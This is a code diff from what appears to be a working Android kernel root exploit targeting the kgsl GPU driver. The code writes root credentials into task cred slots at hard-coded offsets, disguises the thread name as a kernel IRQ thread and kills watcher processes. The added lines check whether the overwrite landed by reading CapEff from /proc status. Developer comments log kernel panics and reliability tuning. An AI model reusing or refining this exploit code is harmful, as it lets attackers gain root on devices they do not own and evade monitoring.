@@ -2260,16 +2260,33 @@ uid0_cred_punch:;
     prctl(PR_SET_NAME, "irq/0-kgsl", 0, 0, 0);
     uintptr_t slot = use_task + TASK_CRED_OFF;
     uid0_one_store(slot, self ? "self_cred" : "child_cred");
-    /* DOUBLE-PUNCH (08-30): single-slot child punches missed 3/3 clean-run
-     * fires (7/9/11 — full pipeline, no landing). The Z29 Image-verified
-     * slots are real_cred=0x778 / cred=0x780; the walk's fdset store can
-     * drift, and one of the two is the landing slot on a given boot. W3
-     * risk accepted — today's spray-free walks survive multi-walk boots
-     * (overnight: 3 processes x 2 walks on one 9h boot). */
-    uid0_one_store(use_task + 0x778, self ? "self_real_cred" : "child_real_cred");
     uid0_kill_watchers(watch, nw);
     nw = uid0_scan_watchers(watch, 32);
     uid0_kill_watchers(watch, nw);
+  }
+  /* Landing check (08-30): /proc/<child>/status CapEff comes from the
+   * SUBJECTIVE cred — it moves even while the child pipe is wedged.
+   * Double-punch (second walk) was tried in F13 and KP'd at the W3 —
+   * do NOT re-add without a between-walks landing check. */
+  {
+    char cpath[64];
+    snprintf(cpath, sizeof(cpath), "/proc/%d/status", (int)child);
+    char buf[512] = {0};
+    int sfd = open(cpath, O_RDONLY);
+    if (sfd >= 0) {
+      (void)read(sfd, buf, sizeof(buf) - 1);
+      close(sfd);
+    }
+    char *ce = strstr(buf, "CapEff:");
+    char ceb[32] = {0};
+    if (ce) {
+      for (int i = 0; i < 31 && ce[i] && ce[i] != '\n'; i++) ceb[i] = ce[i];
+    }
+    char lb[160];
+    snprintf(lb, sizeof(lb), "punch_landing CapEff=[%.24s] getuid=%u",
+             ceb, (unsigned)getuid());
+    pr_info("UID0 %s\n", lb);
+    live_sync_log("UID0", lb);
   }
   uint32_t self_uid_now = (uint32_t)getuid();
   pr_info("UID0 getuid_after_store=%u euid=%u who=%s\n", self_uid_now,
